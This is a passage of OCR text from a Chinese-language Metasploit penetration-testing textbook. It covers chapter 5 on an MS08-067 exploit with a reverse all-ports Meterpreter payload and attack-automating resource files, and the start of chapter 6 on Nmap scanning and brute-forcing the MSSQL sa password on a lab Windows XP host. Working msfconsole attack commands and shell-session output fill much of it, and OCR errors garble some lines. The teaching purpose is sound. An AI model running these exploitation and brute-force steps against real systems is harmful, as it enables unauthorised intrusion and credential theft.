Mask:255.255.255.0
UP BROADCAST RUNNING MULTICASTMTU:1500
Metric:1
RXpackets:3178errors:0dropped:0overruns:0frame:0
TXpackets:2756errors:0dropped:0overruns:0carrier:0
collisions:0 txqueuelen:1000
RX bytes:292351(285.4 KiB)
TXbytes:214234(209.2 KiB)
Interrupt:17 Base address:0x2000
10
Link encap:Local Loopback
inet addr:127.0.0.1
Mask:255.0.0.0
UP LOOPBACK RUNNING
MTU:16436 Metric:1
RX packets:0 errors:0 dropped:0 overruns:o frame:0
TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
collisions:o txqueuelen:0
RX bytes:0 (o.0 b)
）Txbytes:0(o.0 b)
whoami
root
70
---
## Page 98
第5章渗透攻击之旅
这种类型的攻击称为堆溢出攻击，它使用动态内存分配中的漏洞来触发攻击代码，这种攻
击并不是100%可靠的。（如果第一次攻击没有成功，你应当使用exploit命令多尝试几次。）
注意在这个例子中我们使用了一个绑定（bind）shell，在目标主机上打开了一个监听端口，
Metasploit为我们创建了一个直接到目标系统的连接。（记住如果攻击防火墙或NAT网关后的主
机，应当使用反弹式连接攻击载荷。）
5.4全端口攻击载荷：暴力猜解目标开放的端口
在前面的例子中，我们之所以能够成功，主要是由于目标主机反弹连接使用的端口没有被
过滤掉。但是如果我们攻击的组织内部设置了非常严格的出站端口过滤怎么办？很多公司在防
火墙上仅仅开放个别特定的端口，将其他端口一律关闭，这种情况下我们很难判定能够通过哪
些端口连接到外部主机上。
我们可以猜测443端口没有被防火墙禁止，同样的可能还有FTP、Telnet、SSH以及HTTP
等服务使用的端口，可以逐一进行尝试。但是Metasploit已经提供了一个专用的攻击载荷帮助
我们找到这些放行的端口，我们还要费力猜它做什么呢？
Metasploit的这个攻击载荷会对所有可用的端口进行尝试，直到它发现其中一个是放行的。
（不过遍历整个端口号的取值范围[1-65535]会耗费相当长的时间。）
下面让我们使用这个攻击载荷，让它尝试对所有端口进行连接，直到找到成功连接的端口为止。
msf>use windows/smb/ms08_067_netapi
msf exploit(ms08_067_netapi) > set LH0ST 192.168.33.129
1host => 192.168.33.129
smsf exploit(ms08_067_netapi)>set RH0ST 192.168.33.130
rhost => 192.168.33.130
msf exploit(ms08_067_netapi)>set TARGET 3
target=>3
msf exploit(ms08_067_netapi)>searchports
[*]Searching loaded modules for pattern'ports'...
CompatiblePayloads
Name
Rank
Description
=== =
windows/dllinject/reverse_tcp_allports
normal Reflective Dll Injection,
Reverse All-Port TCP Stager
windows/meterpreter/reverse_tcp_allportsnormal Windows Meterpreter (Reflective
Injection), Reverse All-Port TCP Stager
.:. SNIP...
msf exploit(ms08_o67_netapi)>setPAYLoADwindows/meterpreter/reverse_tcp_allports
payload => windows/meterpreter/reverse_tcp_allports
msfexploit(ms08_067_netapi)>exploit-j
[*] Exploit running as background job.
71
---
## Page 99
Metasploit渗透测试指南
msf exploit(ms08_067_netapi)>
[*]Startedreversehandler on 192.168.33.129:10
[*]Triggeringthe vulnerability...
[*]Sending stage(748032 bytes)
[*] Meterpreter session 1 opened (192.168.33.129:1 -> 192.168.33.130:1047) @
msf exploit(mso8_067_netapi)>sessions-1-v
Active sessions
Id  Type
Information
Connection
Via
1meterpreterNTAUTHORITY\PI:EMAIL:1->192.168.33.130:1047
exploit/windows/smb/ms08_067_netapi
msf exploit(ms08_067_netapi)> sessions -i 1
[*]Starting interaction with1...
meterpreter>
请注意我们没有设置LPORT参数，而是使用allports攻击载荷在所有端口上进行监听，
直到发现一个放行的端口。如果你仔细查看①处就会发现我们的攻击机绑定到：1（指所有的端
口），它与目标主机的1047端口建立了连接?。
5.5资源文件
资源文件（resource files）是MSF终端内包含一系列自动化命令的脚本文件。这些文件实
际上是一个可以在MSF终端中执行的命令列表，列表中的命令将按顺序执行。资源文件可以大
大减少测试和开发所需的时间，让你将包括渗透攻击在内的许多重复性任务进行自动化。
可以在MSF终端中使用resource命令载入资源文件，或者可以在操作系统的命令行环境
中使用-r标志将资源文件作为MSF终端的一个参数传递进来运行。
下面这个简单的例子展示了如何创建一个能够显示Metasploit版本，并载入声音插件的资
源文件：
root@bt:/opt/framework3/msf3/echoversion>resource.rc0
root@bt:/opt/framework3/msf3/echoloadsounds>>resource.rc
root@bt:/opt/framework3/msf3/msfconsole-rresource.rc③
resource(resource.rc)>version
Framework:3.7.0-dev.12220
Console:3.7.0-dev.12220
resource(resource.rc)>load sounds
[*] Successfully loaded plugin: sounds
msf >
件中。这个文件随后跟在-r参数后输入到msfconsole中③，最后这个资源文件被载入，其中包
含的两个命令被执行，其执行结果如·所示。
72
---
## Page 100
第5章渗透攻击之旅
在实验环境中你可以尝试使用-一个更为复杂的资源文件，自动地对某台主机发起攻击。下
面的例子展示了使用一个新建的名为autoexploit.rc的资源文件，来执行一次SMB攻击。我们
在这个资源文件中设置了攻击目标、攻击载荷等参数，这样在执行攻击时就不再需要对这些参
数进行手工设置了。
root@bt:/opt/framework3/msf3/ echo set RH0ST 192.168.1.155 >> aurtoexploit.rc
root@bt:/opt/framework3/msf3/ echo set LH0ST 192.168.1.101>> autoexploit.rc
root@bt:/opt/framework3/msf3/echoexploit >>autoexploit.rc
root@bt:/opt/framework3/msf3/msfconsole
msf>resource autoexploit.rc
resource(autoexploit.rc)0>use exploit/windows/smb/ms08_067_netapi
resource (autoexploit.rc)> set RHOST 192.168.1.155
RHOST => 192.168.1.155
PAYLOAD => windows/meterpreter/reverse_tcp
resource (autoexploit.rc)> set LH0ST 192.168.1.101
LHOST => 192.168.1.101
resource (autoexploit.rc)> exploit
[*]Started reverse handler on 192.168.1.101:4444
[*]Triggering the vulnerability...
[*]Sending stage (747008 bytes)
[*]Meterpreter session 1 opened (192.168.1.101:4444 -> 192.168.1.155:1033)
meterpreter>
这里我们在MSF终端中指定资源文件的名字，文件中的命令逐条被自动执行，输出结果如
①所示。
提示：这些只是一些简单的例子，在第12章中，你会学习到如何使用Karmetasploit，它
是一个非常复杂的资源文件。
5.6小结
祝贺你，你已经使用MSF终端发起了第一次针对实际主机的攻击，并获取了它的完全控
制权！
机。渗透攻击的本质是识别并充分利用目标系统中存在的安全弱点。本章中我们使用nmap识
别出可能存在漏洞的服务，在此基础上发动攻击，并获取了系统的访问权限。
在第6章中，我们将对Meterpreter进行更为详细的探讨，并学习如何在攻击成功后玩转它。
你会发现在攻入一个系统后，Meterpreter的强大功能会让你欣喜若狂。
73
---
## Page 101
PDG
---
## Page 102
第
章
Meterpreter
在本章中，我们将对“黑客瑞士军刀”－—Meterpreter进行更加深入的了解，它能够显
著地提升你在后渗透攻击阶段的技术能力。Meterpreter是Metasploit框架中的一个杀手，
通常作为漏洞溢出后的攻击载荷所使用，攻击载荷在触发漏洞后能够返回给我们一个控制通
道。例如，利用远程过程调用（RPC）服务的一个漏洞，当漏洞触发后，我们选择Meterpreter
作为攻击载荷，就能够取得目标系统上的一个MeterpreterShell连接。Meterpreter是
Metasploit框架的一个扩展模块，可以调用Metasploit的一些功能，对目标系统进行更为深
入的渗透，这些功能包括反追踪、纯内存工作模式、密码哈希值获取、特权提升、跳板攻击
等等。
这一一章我们用Metasploit的普遍攻击方法来攻陷一台WindowsXP机器，然后利用
Meterpreter作为攻击载荷，展示它在进入目标系统后的一些其他攻击方法与技术。
---
## Page 103
Metasploit渗透测试指南
6.1攻陷WindowsXP虚拟机
在详细介绍Meterpreter的功能特性之前，我们必须首先攻陷一台系统并取得一个
Meterpreter shell。
6.1.1使用Nmap扫描端口
我们开始使用Nmap对目标进行端口扫描，以识别开放的服务，寻找可以进行漏洞利用的
端口，如下所示：
msf > nmap -sT -A -P0 192.168.33.130 0
[*]exec:nmap -sT-A -P0 192.168.33.130
..SNIP..
PORT
STATE SERVICE
VERSION
21/tcp
openftp
Microsoftftpd
25/tcp
opensmtp
Micr0soft ESMTP 6.0.2600.2180 
80/tcp
openhttp
Microsoft IIS webserver 5.1 @
I_html-title: Directory Listing Denied
135/tcp
open
msrpc
Microsoft Windows RPC
139/tcp
open
1netbios-ssn
445/tcp open
microsoft-ds Microsoft Windows xP microsoft-ds
1025/tcp openmsrpc
Microsoft Windows RPC
1433/tcp open ms-sql-s
Microsoft SQL Server 2005 9.00.1399; RTM @
6646/tcp open unknown
MAC Address: 00:0C:29:EA:26:7C (VMware)
Device type: general purpose
Running:Microsoft Windows XP|2003
OS details: Microsoft Windows XP Professional SP2  or Windows Server 2003
Nmap done:1 IP address(1 host up）scanned in 37.58 seconds
msf>
通过端口扫描·可以看到，系统开放了一些有意思的端口，包括MSSQL·这种易受攻击
的端口。但更有意思的是通过nmap扫描，发现系统版本为WindowsXPServicePack2③，这个
版本的系统已经不再维护，许多已公开漏洞在SP3系统中已经修补，但在SP2中依然存在。
扫描结果中可以看到开放了FTPO和SMTP端口，这两个端口可能存在可被利用的漏洞。
同时也开放了80端口?，意味着我们可以尝试进行Web应用攻击。
6.1.2攻击MSSQL
在这个例子中，我们将对MSSQL的1433端口进行攻击，因为这个端口有许多已知的漏
洞，可以实现完全入侵并获得管理员权限。
76
---
## Page 104
第6章Meterpreter
首先，我们需要确认安装了MSSQL，然后尝试对MSSQL服务进行暴力破解以获取密码，
MSSQL默认安装在TCP1433端口和UDP1434端口，但新版本的MSSQL允许安装到随机动
态分配的TCP端口，UDP1434端口则没有变化，可以通过UDP端口来查询获取SQL服务的
TCP动态端口。
这里，通过扫描发现目标系统上的UDP1434端口是开放的：
msf > nmap -sU 192.168.33.130 -p1434 0
Nmap scan report for 192.168.33.130
Host is up (o.00033s latency).
PORT
STATE
SERVICE
1434/udp open
ms-sq1-m ②
Nmap done: 1 IP address (1 host up) scanned in 0.46 seconds
msf >
可以看到，扫描主机0发现MSSQL的UDP1434端口是开放的?。（第11、13和17章
将会对MSSQL攻击作更为深入的介绍。）
以MS SQL为目标，我们可以使用mssql_ping模块来找出MS SQL服务端口，并进行用户
名与口令的猜测。MS SQL在初次安装的时候需要用户创建sa或系统管理员用户。由于有些管
理员在安装程序时没有足够的安全意识，常常会设置空密码或弱密码，因此我们可以尝试猜测
或暴力破解sa用户的密码。
下一个例子中，我们将使用mssql_login模块来尝试对sa用户进行暴力破解。
msf >use scanner/mssql/mssql_ping
msf auxiliary(mssql_ping) > show options
Module options:
Name
Current SettingRequiredDescription
PASSWORD
no
The password for the specified username
RHOSTS
yes
The target address range or CIDR identifier
THREADS
yes